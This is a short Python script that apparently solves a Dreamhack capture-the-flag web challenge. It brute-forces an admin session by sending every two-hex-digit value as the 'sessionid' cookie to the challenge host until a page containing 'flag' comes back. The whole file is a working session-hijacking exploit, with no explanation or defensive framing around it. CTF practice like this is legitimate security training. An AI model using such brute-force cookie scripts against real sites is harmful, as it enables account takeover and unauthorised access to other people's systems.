import requests
import os

PORT = 16647
HOST = f'http://host3.dreamhack.games:{PORT}'

for c in range(0x00, 0x100):
    admin_pw = hex(c)[2:].zfill(2)
    header = {f'cookie': f'sessionid={admin_pw}'}
    response = requests.get(
        f'{HOST}', headers=header)

    if "flag" in response.text:
        print(f'Admin sessionid : {admin_pw}')
        break
    else:
        print(f'{admin_pw}: Nope')
